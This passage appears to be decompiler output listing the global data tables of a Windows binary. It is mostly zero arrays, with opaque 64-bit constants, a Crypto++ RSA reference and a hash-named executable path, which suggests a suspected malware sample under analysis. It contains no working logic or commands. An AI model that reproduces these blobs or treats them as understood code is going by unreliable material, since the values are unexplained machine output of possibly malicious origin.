  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
__int64 qword_13F1C4DD0[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1C4DE0[256] =
{
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
char byte_13F1C55E0 = '\0'; // weak
char byte_13F1C55E1 = '\0'; // weak
int dword_13F1C5640 = -2147483646; // weak
int dword_13F1C56A0 = -2147483645; // weak
char byte_13F1C56B0 = '\x01'; // weak
char byte_13F1C56B1 = '\x01'; // weak
char byte_13F1C56B2 = '\x01'; // weak
char byte_13F1C56B3 = '\x01'; // weak
char byte_13F1C56B4 = '\x01'; // weak
char byte_13F1C56B5 = '\x01'; // weak
char byte_13F1C56B6 = '\x01'; // weak
char byte_13F1C56B7 = '\x01'; // weak
char byte_13F1C56B8 = '\x01'; // weak
char byte_13F1C56B9 = '\x01'; // weak
char byte_13F1C56BA = '\0'; // weak
char byte_13F1C56BB = '\x01'; // weak
char byte_13F1C56BC = '\0'; // weak
char byte_13F1C56BD = '\x01'; // weak
char byte_13F1C56BE = '\x01'; // weak
char byte_13F1C56BF = '\0'; // weak
char byte_13F1C56C0 = '\0'; // weak
char byte_13F1C56C1 = '\0'; // weak
char byte_13F1C56C2 = '\0'; // weak
char byte_13F1C56C3 = '\0'; // weak
int dword_13F1C56D0 = 0; // weak
__int64 qword_13F1C56D8[4] = { 3987696i64, 4294967295i64, 0i64, 0i64 }; // weak
__int64 qword_13F1C5700 = 0i64; // weak
__int64 qword_13F1C5708 = 0i64; // weak
__int64 qword_13F1C5710 = 2143363167767581918i64; // weak
__int64 qword_13F1C5718 = 2145569011431199966i64; // weak
__int64 qword_13F1C5720[2] = { 65537i64, 4099585i64 }; // weak
__int64 qword_13F1C5738 = 0i64; // weak
char byte_13F1C5740 = '\0'; // weak
__int128 xmmword_13F1C5748 = 0xFFFFD33A108EAB21FFFFD33A108EAB21i64; // weak
int TlsIndex = 0; // weak
int dword_13F1C5CF4 = 2; // weak
int dword_13F1C5CF8 = 0; // weak
__int64 qword_13F1C5D00 = 2i64; // weak
__int64 qword_13F1C5D10 = 0i64; // weak
__int64 qword_13F1C5D18 = 0i64; // weak
__int64 qword_13F1C5D20 = 0i64; // weak
int dword_13F1C5D30 = 0; // weak
__int64 qword_13F1C5D38 = 0i64; // weak
__int64 (*off_13F1C5D40)[2] = &qword_13F1B73A0; // weak
__int64 qword_13F1C5D58 = 0i64; // weak
__int64 qword_13F1C5D60 = 0i64; // weak
__int64 qword_13F1C5D68 = 0i64; // weak
__int64 qword_13F1C5D78 = 0i64; // weak
int dword_13F1C5D80 = 0; // weak
char byte_13F1C5D84 = '\0'; // weak
int dword_13F1C5D88 = 0; // weak
int dword_13F1C5D8C = 0; // weak
int dword_13F1C5D90 = 0; // weak
int dword_13F1C5D94 = 0; // weak
__int64 qword_13F1C5D98 = 0i64; // weak
__int64 qword_13F1C5DA0 = 0i64; // weak
int dword_13F1C5DB0 = 0; // weak
int dword_13F1C5DB4 = 0; // weak
int dword_13F1C5DB8 = 0; // weak
int dword_13F1C5DBC = 0; // weak
int dword_13F1C5DC0 = 0; // weak
__int64 qword_13F1C5DC8 = 0i64; // weak
int dword_13F1C5DD0 = 1; // weak
int dword_13F1C5DD4 = 0; // weak
int dword_13F1C5DD8 = 0; // weak
int dword_13F1C5DDC = 0; // weak
__int64 qword_13F1C5DE0[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1C5DF0 = -1999737117652117968i64; // weak
int dword_13F1C5DF8 = 0; // weak
__int64 qword_13F1C5E00 = 0i64; // weak
__int64 qword_13F1C5E08 = 0i64; // weak
__int64 qword_13F1C5E10 = 0i64; // weak
__int64 qword_13F1C5E18 = 0i64; // weak
__int64 qword_13F1C5E20 = 0i64; // weak
__int64 qword_13F1C5E28 = 0i64; // weak
__int64 qword_13F1C5E30 = 0i64; // weak
__int64 qword_13F1C5E38 = 0i64; // weak
__int64 qword_13F1C5E40 = 0i64; // weak
__int64 qword_13F1C5E48 = 0i64; // weak
__int64 qword_13F1C5E50 = 0i64; // weak
__int64 qword_13F1C5E58 = 0i64; // weak
__int64 qword_13F1C5E60 = 0i64; // weak
__int64 qword_13F1C5E68 = 0i64; // weak
__int64 qword_13F1C5E70 = 0i64; // weak
__int64 qword_13F1C5E78 = 0i64; // weak
__int64 qword_13F1C5E80 = 0i64; // weak
int dword_13F1C5E88 = 0; // weak
__int64 qword_13F1C5EA0 = 0i64; // weak
int dword_13F1C5EAC = 0; // weak
__int64 qword_13F1C5EB0 = 0i64; // weak
int dword_13F1C5EB8 = 0; // weak
char byte_13F1C5EBC = '\0'; // weak
__int64 qword_13F1C5EC0 = 0i64; // weak
__int64 qword_13F1C5EC8 = 0i64; // weak
int dword_13F1C5ED0 = 0; // weak
int dword_13F1C5ED4 = 0; // weak
__int64 qword_13F1C5EE0[15] =
{
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
int dword_13F1C5F58 = -2; // weak
__int64 qword_13F1C5F60 = -2i64; // weak
__int64 qword_13F1C5F70 = 2157184i64; // weak
__int64 qword_13F1C5F78 = 2157272i64; // weak
__int64 qword_13F1C5F80 = 0i64; // weak
void *off_13F1C5F88 = (void *)0x13F1C306Ai64; // weak
char *off_13F1C5F90 = "?AVRSAFunction@CryptoPP@@"; // weak
int dword_13F1C5F98 = 10240; // weak
char byte_13F1C5F9C = '\0'; // weak
char byte_13F1C5F9D = '\0'; // weak
__int64 qword_13F1C5FA0 = 0i64; // weak
int dword_13F1C5FA8 = 0; // weak
int dword_13F1C5FAC = 0; // weak
__int64 (__fastcall *off_13F1C5FB0)(_QWORD) = &sub_13F15E524; // weak
__int64 (__fastcall *off_13F1C5FB8)(_QWORD) = &sub_13F12E550; // weak
__int128 xmmword_13F1C5FC0 = 0i64; // weak
__int64 qword_13F1C5FD0 = 3832i64; // weak
__int64 qword_13F1C5FD8 = 49228637361374i64; // weak
__int64 qword_13F1C5FE0[4] = { 3935152i64, 4294967295i64, 0i64, 0i64 }; // weak
int dword_13F1C6008 = 1; // weak
__int64 qword_13F1C6010[] = { -1i64 }; // weak
__int64 qword_13F1C6028[] = { 2143209064341001438i64 }; // weak
int dword_13F1C6050 = 512; // weak
__int64 qword_13F1C6058 = 3981808i64; // weak
__int64 qword_13F1C6060 = 49228637361374i64; // weak
int dword_13F1C6068 = 0; // weak
__int64 qword_13F1C6070 = 49228637361374i64; // weak
char byte_13F1C6078 = '\0'; // weak
char byte_13F1C6079[3] = { '\0', '\0', '\0' }; // weak
int dword_13F1C607C = 0; // weak
__int64 qword_13F1C6080 = 10000000i64; // weak
__int64 qword_13F1C6088 = 4938174926356i64; // weak
__int64 qword_13F1C6090 = 49228637361374i64; // weak
__int64 qword_13F1C61A8 = 3990528i64; // weak
__int64 qword_13F1C61B0 = 0i64; // weak
__int64 qword_13F1C61C8[3] = { 4257403234243806i64, 4257566443001054i64, 4259327379592414i64 }; // weak
__int64 qword_13F1C61E0[3] = { 49228637361374i64, 49228637361374i64, 49228637361374i64 }; // weak
int dword_13F1C61F8 = 1; // weak
__int64 qword_13F1C6200 = 49228637361374i64; // weak
int dword_13F1C6208 = 1; // weak
__int64 qword_13F1C6210 = 3943264i64; // weak
__int64 qword_13F1C6218 = 0i64; // weak
__int64 qword_13F1C6220 = 3750432i64; // weak
__int64 qword_13F1C6228 = 3746836i64; // weak
char *off_13F1C6230 = "C:\\Users\\Francesco\\Desktop\\v\\d9f7bb98ad01c4775ec71ec66f5546de131735e6dba8122474cc6eb62320e47b.exe.EXE"; // weak
int dword_13F1C6238 = 0; // weak
int dword_13F1C623C = 0; // weak
__int64 qword_13F1C6240[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1C6250[] = { 0i64 }; // weak
__int64 qword_13F1C62F0[] = { 49228637361374i64 }; // weak
int dword_13F1C63F0 = 0; // weak
__int64 qword_13F1C6400[] = { 3948512i64 }; // weak
int dword_13F1C6800 = 64; // weak
__int64 qword_13F1C6810 = 0i64; // weak
__int64 qword_13F1C6818 = 0i64; // weak
wchar_t **off_13F1C6820 = &off_13F1B74B0; // weak
__int64 qword_13F1C6830[4] = { 3935216i64, 4294967295i64, 0i64, 0i64 }; // weak
int dword_13F1C6A38 = 13; // weak
int dword_13F1C6A3C = 1; // weak
int dword_13F1C6A40 = 1; // weak
int dword_13F1C6A44 = 1252; // weak
int dword_13F1C6A48 = 0; // weak
__int64 qword_13F1C6A50 = 0i64; // weak
int dword_13F1C6A58 = 0; // weak
int dword_13F1C6A5C = 0; // weak
__int64 qword_13F1C6A60 = 0i64; // weak
__int64 qword_13F1C6A70 = 3735552i64; // weak
__int64 qword_13F1C6A78 = 49228637361374i64; // weak
__int64 qword_13F1C6A80 = 49228637361374i64; // weak
__int64 qword_13F1C6A88 = 49228637361374i64; // weak
__int64 qword_13F1C6A90 = 49228637361374i64; // weak
int dword_13F1C6A98 = 16384; // weak
__int64 qword_13F1C6AA0[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1C6AB0[4] = { 3988016i64, 4294967295i64, 0i64, 0i64 }; // weak
__int64 qword_13F1C6CC0 = 0i64; // weak
__int64 qword_13F1C6CD0[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1C6CE0[49] =
{
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
__int64 qword_13F1C6E68[9] = { 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64 }; // weak
__int64 qword_13F1C6EB0[2] = { 0i64, 0i64 }; // weak
int dword_13F1C7000 = 28800; // weak
int dword_13F1C7004 = 1; // weak
int dword_13F1C7008 = -3600; // weak
__int64 (*(*off_13F1C7010)[2])[8] = &off_13F1B7C70; // weak
__int64 qword_13F1C70E0[2] = { 4i64, 0i64 }; // weak
__int64 qword_13F1C70F0[512] =
{
  650221696548241968i64,
  72354425775621674i64,
  3661932116575489i64,
  72763489227276848i64,
  -1564277352753024512i64,
  3613708497121858972i64,
  2363796166866042435i64,
  -135314268424111863i64,
  4390392963992296712i64,
  -2291552080316158890i64,
  8052195612872450017i64,
  2805534409621549716i64,
  -4124926241910244126i64,
  -8729057584635705170i64,
  2531815686148116530i64,
  -4346893765777383959i64,
  6678071425853144738i64,
  -5611893702743031904i64,
  2057118409002446014i64,
  -5288432663938683804i64,
  1491404328369079933i64,
  -890630118047442751i64,
  8655914962655125434i64,
  -7086294409573761316i64,
  8701147179716368658i64,
  4524413690522158248i64,
  -1466818721955203469i64,
  5945155620525877060i64,
  -1522514200379770965i64,
  -8525836286711492657i64,
  3345989061036078864i64,
  6909077320013003890i64,
  3994937109992318132i64,
  5901589913154731729i64,
  5664024497161767224i64,
  1470891418663689980i64,
  -7891720781629265863i64,
  -8996377984474462890i64,
  -7526374629063755455i64,
  -3551772351968081446i64,
  -2951354422327492775i64,
  8969262262458952732i64,
  -5916165081607811753i64,
  -3516666037970860538i64,
  -3446326359439701000i64,
  8003524774812189024i64,
  -2943051310871978905i64,
  -1098891642108251190i64,
  5984617180552809134i64,
  -8220832533549698285i64,
  -170817989012440221i64,
  6453519291149894372i64,
  8879493429638160794i64,
  5309975613142780482i64,
  -5988775790658605308i64,
  5922098922781344063i64,
  -2142823699487369106i64,
  1939284427904476566i64,
  5064742603887926111i64,
  6548688956135514808i64,
  863551192571207630i64,
  3949310305975728836i64,
  -3664952233216554469i64,
  5958762073047161117i64,
  -6009518679365426226i64,
  1944274747812939437i64,
  2322646030473986012i64,
  -5639611256374253255i64,
  285278921i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
__int64 qword_13F1C80F0 = 1632064957i64; // weak
__int64 qword_13F1C8100[512] =
{
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
__int64 qword_13F1C9100[513] =
{
  -6228873739092440222i64,
  -3762235171835619832i64,
  3000457454415798882i64,
  -8056260453429526018i64,
  -6371844210676409383i64,
  -5525461064441864576i64,
  -5133927369638864483i64,
  7220171302315838801i64,
  4367524549835590351i64,
  -4281020916941774090i64,
  8887664659048080497i64,
  -2167210824327296145i64,
  3019216042723531094i64,
  4412578386172458944i64,
  3105223327189260437i64,
  4258831898041301318i64,
  6889169154973541800i64,
  8987620038593747550i64,
  -3794480871947585255i64,
  4498826084824311946i64,
  387560487956580883i64,
  -1736998479367757935i64,
  1033740358549213748i64,
  5042373460788143235i64,
  372307446181314824i64,
  -7250337071665403131i64,
  -4006331774540137214i64,
  5619035794518076286i64,
  -8873669012661393448i64,
  4979063491052236087i64,
  8125954866088852783i64,
  -8904210317425480243i64,
  -3671926781214875473i64,
  -4052378187178808419i64,
  -260033911972142717i64,
  3491438837573416568i64,
  -7685712683473317749i64,
  -2515976965011062255i64,
  -3460335160113345787i64,
  5107478586559710654i64,
  3332175161482661363i64,
  1658555653038246670i64,
  124212988083940649i64,
  2917664156148996056i64,
  6881972051935151734i64,
  -2086505707492228741i64,
  -6807831061270843513i64,
  6224514102965028086i64,
  -1069685482983043859i64,
  6495205785005364738i64,
  -5545659283614596245i64,
  3975206099350946656i64,
  -1676567683289403792i64,
  -5172502695380386048i64,
  5668582230679563133i64,
  -5916127635081662550i64,
  7597814295386800558i64,
  -3070423000506824429i64,
  -8946422284606810503i64,
